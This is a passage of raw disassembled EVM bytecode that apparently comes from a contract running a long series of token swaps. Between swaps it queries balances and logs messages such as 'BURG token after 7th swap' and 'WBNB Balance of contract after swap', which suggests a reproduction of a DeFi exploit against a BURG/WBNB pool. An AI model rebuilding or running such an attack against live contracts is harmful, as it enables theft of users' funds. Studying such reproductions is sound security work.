DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1073 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1097 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x10A4 SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x10E0 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1113 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1130 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x1158 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x117C JUMPI PUSH2 0x117C PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0x11DF SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E2061667465722037746820737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x123D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1261 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x126E SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x12AA PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x12DD SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x12FA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x1322 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP2 SWAP3 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x137D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x13A1 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x13AE SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x13D8 JUMPI PUSH2 0x13D8 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0x143B SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E2061667465722038746820737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x1477 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x14AA SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x14C7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x14EF SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x1525 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1558 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1575 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x159D SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x15D3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1606 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1623 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x164B SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x1681 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x16B4 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x16D1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x16F9 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x172F PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1762 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x177F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x17A7 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x17DD PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1810 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x182D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x1855 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x188B PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x18BE SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x18DB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x1903 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x1939 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x196C SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1989 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x19B1 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x19E7 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1A1A SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1A37 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x1A5F SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x1A95 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1AC8 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1AE5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x1B0D SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x1B43 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1B76 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1B93 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x1BBB SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x1BF1 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1C47 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1C6B SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1CC2 SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x27 SWAP1 DUP3 ADD MSTORE PUSH32 0x57424E422042616C616E6365206F6620636F6E74726163742061667465722073 PUSH1 0x60 DUP3 ADD MSTORE PUSH7 0x3BB0B839971717 PUSH1 0xC9 SHL PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x1CEC JUMPI PUSH2 0x1CEC PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 SWAP1 DUP2 MUL SWAP2 SWAP1 SWAP2 ADD DUP2 ADD MLOAD PUSH1 0x40 DUP1 MLOAD DUP2 DUP2 MSTORE 